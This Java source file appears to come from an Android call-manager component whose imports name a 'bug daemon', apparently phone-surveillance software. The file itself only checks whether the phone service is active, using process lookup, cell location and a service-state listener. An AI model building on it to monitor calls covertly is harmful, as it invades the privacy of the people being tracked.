package com.vvt.callmanager.std;

import java.util.HashSet;

import android.content.Context;
import android.os.Looper;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.Customization;
import com.vvt.logger.FxLog;
import com.vvt.shell.LinuxProcess;
import com.vvt.shell.ShellUtil;

public class PhoneServiceWrapper {
	
	private static final String TAG = "PhoneServiceWrapper";
	private static final boolean LOGV = Customization.VERBOSE;
	
	public static boolean isPhoneServiceActive(Context context) {
		HashSet<LinuxProcess> processes = ShellUtil.findDuplicatedProcess(BugDaemonResource.PROC_ANDROID_PHONE);
		boolean isPhoneProcessFound = processes != null && processes.size() > 0;
		
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		CellLocation cell = tm.getCellLocation();
		boolean isCellDetected = cell != null && 
				(cell instanceof GsmCellLocation || cell instanceof CdmaCellLocation);
        
        return isPhoneProcessFound && isCellDetected;
	}
	
	public static boolean isPhoneServiceActiveSync(Context context) {
		SyncPhoneService syncPhoneService = new SyncPhoneService();
        
        ListenerThread t = new ListenerThread(context, syncPhoneService);
        t.start();
		
		return syncPhoneService.getState();
	}
	
	private static class ListenerThread extends Thread {
    	
    	private Context mContext;
    	private SyncPhoneService mWrapper;
    	private TelephonyManager mTm;
    	
    	public ListenerThread(Context context, SyncPhoneService wrapper) {
    		mContext = context;
    		mWrapper = wrapper;
    		mTm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
		}
    	
    	@Override
    	public void run() {
    		if (LOGV) FxLog.v(TAG, "run # ENTER ...");
    		Looper.prepare();
    		
    		PhoneStateListener listener = new PhoneStateListener() {
            	@Override
            	public void onServiceStateChanged(ServiceState serviceState) {
            		boolean isPhoneServiceActive = false;
            		
            		int state = serviceState.getState();
            		switch (state) {
                		case ServiceState.STATE_IN_SERVICE:
                			isPhoneServiceActive = true;
                			break;
                		case ServiceState.STATE_OUT_OF_SERVICE:
                		case ServiceState.STATE_EMERGENCY_ONLY:
                		case ServiceState.STATE_POWER_OFF:
                			isPhoneServiceActive = false;
                			break;
            		}
            		
            		if (LOGV) FxLog.v(TAG, String.format(
            				"onServiceStateChanged # isPhoneServiceActive: %s", 
            				isPhoneServiceActive));
            		
            		mWrapper.setState(isPhoneServiceActive);
            		
            		mTm.listen(this, PhoneStateListener.LISTEN_NONE);
            		
            		Looper myLooper = Looper.myLooper();
            		if (myLooper != null) myLooper.quit();
            	}
            };
    		
            mTm.listen(listener, PhoneStateListener.LISTEN_SERVICE_STATE);
    		if (LOGV) FxLog.v(TAG, "run # Listener is registered");
    		
    		Looper.loop();
    		if (LOGV) FxLog.v(TAG, "run # EXIT ...");
    	}
    }

}
